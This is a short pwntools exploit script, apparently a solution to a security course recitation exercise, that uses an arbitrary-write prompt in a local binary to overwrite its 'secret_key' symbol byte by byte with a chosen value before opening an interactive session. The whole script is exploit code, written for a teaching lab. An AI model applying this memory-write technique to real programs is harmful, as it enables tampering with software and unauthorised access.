from pwn import *

# context.log_level = "DEBUG"
e = ELF("./recitation5.2", checksec=False)

new_key = [byte for byte in p64(0xdeadbeef1337c0d3)]
p = process("./recitation5.2")
for i in range(0,8):
    p.recvuntil(b"> ")
    p.send(p64(e.symbols.secret_key + i))
    p.recvuntil(b"> ")
    p.send(p8(new_key[i]))
p.interactive()
